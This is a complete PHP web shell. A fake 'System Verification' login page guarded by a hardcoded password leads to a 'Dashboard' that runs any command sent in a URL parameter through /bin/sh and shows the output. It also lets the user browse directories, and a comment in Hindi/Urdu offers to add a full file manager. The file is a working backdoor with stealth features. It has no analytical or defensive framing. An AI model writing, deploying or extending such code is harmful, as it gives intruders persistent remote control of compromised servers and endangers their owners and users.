<?php
error_reporting(0);

// Force destroy old session
if (isset($_GET['reset'])) {
    session_unset();
    session_destroy();
    setcookie(session_name(), '', time()-3600);
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

session_start();

// Password
$password = "wiredmouseis";   // ← Change this

// Strong Auth Check
if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
    if (isset($_POST['key']) && $_POST['key'] === $password) {
        $_SESSION['login'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    // Stealth Login Page
    die('
    <!DOCTYPE html>
    <html>
    <head><title>Index</title>
    <style>
        body{background:#f4f4f4;color:#333;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .box{background:white;padding:35px 25px;border-radius:8px;box-shadow:0 0 15px rgba(0,0,0,0.15);text-align:center;width:340px;}
        input{width:100%;padding:15px;font-size:17px;border:1px solid #999;border-radius:5px;margin:10px 0;}
        button{width:100%;padding:14px;background:#0066cc;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;}
    </style>
    </head>
    <body>
        <div class="box">
            <h3>System Verification</h3>
            <form method="post">
                <input type="password" name="key" placeholder="Enter code" autofocus>
                <button type="submit">Verify</button>
            </form>
        </div>
    </body>
    </html>');
}

// ====================== PANEL ======================
$dir = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
if (!is_dir($dir)) $dir = getcwd();
chdir($dir);

$cmd = $_GET['c'] ?? '';
?>

<!DOCTYPE html>
<html>
<head>
    <title>Dashboard</title>
    <style>
        body {background:#0a0a0a; color:#ddd; font-family:Consolas; padding:15px; margin:0;}
        .header {background:#111; padding:12px; margin:-15px -15px 15px -15px; display:flex; justify-content:space-between;}
        input[type=text] {width:70%; padding:12px; background:#111; border:1px solid #0f0; color:#0f0;}
        button {padding:12px 25px; background:#111; border:1px solid #0f0; color:#0f0;}
        .output {background:#000; padding:15px; border:1px solid #333; margin:10px 0; white-space:pre-wrap;}
    </style>
</head>
<body>

<div class="header">
    <h3>Dashboard</h3>
    <a href="?reset=1" style="color:red;">Logout</a>
</div>

<form method="GET">
    <input type="text" name="c" placeholder="id || whoami || ls -la" autofocus>
    <button type="submit">Run</button>
</form>

<?php if($cmd): ?>
<div class="output">
    <b>→ <?=htmlspecialchars($cmd)?></b><br><br>
    <?php
    $out = '/tmp/o'.rand(10000,99999).'.txt';
    if(function_exists('pcntl_fork') && function_exists('pcntl_exec')){
        $pid = pcntl_fork();
        if($pid == 0){
            pcntl_exec('/bin/sh', ['-c', $cmd." > $out 2>&1"]);
            exit();
        }
        sleep(2);
    }
    $res = file_exists($out) ? file_get_contents($out) : '';
    @unlink($out);
    echo nl2br(htmlspecialchars($res ?: "No output"));
    ?>
</div>
<?php endif; ?>

<!-- File Manager short version -->
<h4>File Manager</h4>
<!-- Agar full file manager chahiye toh batao, abhi short rakh raha hoon -->

</body>
</html>
